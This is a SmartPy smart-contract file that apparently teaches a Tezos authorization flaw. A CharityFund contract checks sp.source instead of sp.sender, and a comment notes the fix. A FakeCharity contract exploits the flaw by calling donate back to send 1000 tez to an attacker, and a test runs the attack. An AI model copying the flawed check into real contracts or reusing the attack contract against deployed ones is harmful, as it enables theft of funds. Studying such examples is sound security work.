import smartpy as sp

@sp.module
def main():

    class CharityFund(sp.Contract):
    
        def __init__(self, admin):
            self.data.admin = admin
            
        @sp.entrypoint
        def donate(self, donation, charity):
           assert sp.source == self.data.admin
           #replace sp.source with sp.sender
           sp.send(charity, donation)

        @sp.entrypoint
        def deposit(self):
            pass
           
    class FakeCharity(sp.Contract):
        def __init__(self, attackedContract, attacker):
            self.data.attackedContract = attackedContract
            self.data.attacker = attacker

        @sp.entrypoint
        def default(self):
            charity_contract = sp.contract(sp.record(donation = sp.mutez, charity = sp.address),
                                           self.data.attackedContract,
                                           entrypoint="donate").unwrap_some()
            sp.transfer(sp.record(donation = sp.tez(1000), charity = self.data.attacker),
                        sp.tez(0),
                        charity_contract)

@sp.add_test(name='Testing charity attack')
def test():
    admin = sp.test_account("admin").address
    attacker = sp.test_account("attacker").address
    charityFund = main.CharityFund(admin)
    scenario = sp.test_scenario(main)
    scenario += charityFund
    charityFund.deposit().run(amount = sp.tez(10000), sender = admin)

    fakeCharity = main.FakeCharity(attackedContract = charityFund.address, attacker = attacker)
    scenario += fakeCharity
    charityFund.donate(donation = sp.tez(1), charity = fakeCharity.address).run(sender = admin)

    charityFund.deposit().run(amount = sp.tez(0), sender = admin)